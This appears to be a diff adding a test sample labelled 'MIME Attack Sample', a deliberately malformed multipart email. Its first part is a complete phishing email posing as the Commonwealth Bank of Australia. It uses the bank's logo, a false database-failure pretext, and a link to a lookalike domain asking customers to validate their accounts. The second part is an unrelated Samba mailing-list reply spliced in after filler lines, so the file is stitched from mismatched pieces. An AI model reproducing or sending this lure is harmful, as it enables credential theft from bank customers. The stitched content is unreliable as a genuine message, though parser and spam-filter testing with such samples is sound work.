@@ -1,0 +1,119 @@
+From: richard.deyoung@ubspainewebber.com
+To: "Noftz Leslie" <theorize@plg.uwaterloo.ca>
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+0
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+Content-Length: 1655
+Lines: 41
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 288
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Commonwealth Bank</title>
+<style type="text/css">
+<!--
+style2 {font-family: Verdana, Arial, Helvetica, sans-serif}
+style3 {
+	font-size: 12px;
+	color: #999999;
+}
+style4 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	color: #999999;
+}
+-->
+</style>
+</head>
+
+<body>
+<table width="513" border="0" cellpadding="0">
+  <tr>
+    <td><img src="http://www.commbank.com.au/CommonImages/CBA_Logo.gif" alt="logo" width="262" height="46" /></td>
+  </tr>
+  <tr>
+    <td><p>&nbsp;</p>
+      <p class="style2">Dear Commonwealth Bank of Australia customer, </p>
+      <p class="style2">Due to recent hardware failure and partial loss of our database we decided to review our customers account information to prevent security problems.<br />
+        All our customers are required to provide valid information. Once your information is verified you will not run into any further problems.<br />
+        Please follow the link below to complete validation process:</p>
+      <p class="style2"><a href="http://www3.netbank.commbank.com.au.user5288.net/netbank/bankmain">http://www3.netbank.commbank.com.au.user5288.net/netbank/bankmain</a></p>
+      <p class="style2">Thank You,<br />
+        Commonwealth Bank of Australia Management Stuff </p>
+      <p class="style2">--<br />
+        <span class="style3">Please do not reply to this email. This mailbox is not monitored and you will not receive a response.</span></p>
+      <p class="style4">1822CYH308HSB84QTAR2367BP</p>    </td>
+  </tr>
+</table>
+</body>
+</html>
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+simo wrote:
+> On Sun, 2007-05-06 at 17:37 -0500, Gerald (Jerry) Carter wrote:
+>> -----BEGIN PGP SIGNED MESSAGE-----
+>> Hash: SHA1
+>>
+>> Hey guys,
+>>
+>> I've pushed out all my pending patches for winbindd except:
+>>
+>> (a) security = ads & machine password change in winbindd
+>> (b) username map support for winbindd
+>>
+>> Since these might possibly require some discussion and general
+>> agreement, I'll post patches to the list here.
+> 
+> Thank you Jerry,
+> this is a lot of good code, I am going through it and made some comments
+> to the relevant commit when necessary.
+> 
+> I will try to test this stuff asap myself as well.
+
+Thanks.  If you have questions about why I did
+things a certain way, just ping me.
+
+
+
+
+cheers, jerry
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.3 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGPoGLIR7qMdg1EfYRAiEBAJ9QxUS254IPhgyYR179YcEb4bxa6wCaAiKL
+/1VvXF/w8fyIhBmT8Qw+ko0=
+=Mj3m
+-----END PGP SIGNATURE-----
+-BOUNDARY--
